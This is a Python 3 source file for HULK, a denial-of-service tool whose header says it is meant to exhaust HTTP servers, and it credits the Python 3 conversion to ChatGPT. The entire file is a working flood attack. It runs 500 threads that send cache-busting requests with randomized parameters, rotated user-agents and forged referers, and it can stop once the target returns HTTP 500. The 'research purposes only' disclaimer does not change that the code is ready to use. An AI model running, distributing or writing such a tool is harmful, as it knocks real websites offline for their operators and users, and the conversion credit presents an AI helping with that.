# ----------------------------------------------------------------------------------------------
# HULK - HTTP Unbearable Load King (Python 3 Version)
#
# This tool is a DoS tool that is meant to put heavy load on HTTP servers in order to bring them
# to their knees by exhausting the resource pool. It is meant for research purposes only,
# and any malicious usage of this tool is prohibited.
#
# Author: OpIcarus (Converted for Python 3 by ChatGPT)
# ----------------------------------------------------------------------------------------------

import urllib.request
import sys
import threading
import random
import re

# Global variables
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

# Generates a user-agent list
def useragent_list():
    global headers_useragents
    headers_useragents = [
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
    ]
    return headers_useragents

# Generates a referer list
def referer_list():
    global headers_referers
    headers_referers = [
        'http://www.google.com/?q=',
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q=',
        f'http://{host}/'
    ]
    return headers_referers

# Builds a random ASCII string
def buildblock(size):
    return ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ", k=size))

def usage():
    print('---------------------------------------------------')
    print('USAGE: python3 hulk.py <url>')
    print('You can add "safe" after the URL to auto-shutdown after DoS')
    print('---------------------------------------------------')

# HTTP request
def httpcall(url):
    useragent_list()
    referer_list()
    code = 0

    param_joiner = "&" if "?" in url else "?"
    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))

    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
    request.add_header('Keep-Alive', str(random.randint(110, 120)))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)

    try:
        urllib.request.urlopen(request)
    except urllib.error.HTTPError as e:
        set_flag(1)
        print('Response Code 500')
        code = 500
    except urllib.error.URLError as e:
        sys.exit()
    else:
        inc_counter()
        urllib.request.urlopen(request)
    
    return code

# HTTP caller thread
class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if code == 500 and safe == 1:
                    set_flag(2)
        except Exception as ex:
            pass

# Monitors HTTP threads and counts requests
class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if previous + 100 < request_counter and previous != request_counter:
                print(f"{request_counter} Requests Sent")
                previous = request_counter
        if flag == 2:
            print("\n-- Attack Stopped --")

# Execute
if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
        print("-- Attack has Started --")
        if len(sys.argv) == 3 and sys.argv[2] == "safe":
            set_safe()
        
        url = sys.argv[1]
        if url.count("/") == 2:
            url = url + "/"
        
        m = re.search(r'http://([^/]*)/?.*', url)
        if m:
            host = m.group(1)
        else:
            print("Invalid URL format!")
            sys.exit()

        for i in range(500):
            t = HTTPThread()
            t.start()

        t = MonitorThread()
        t.start()
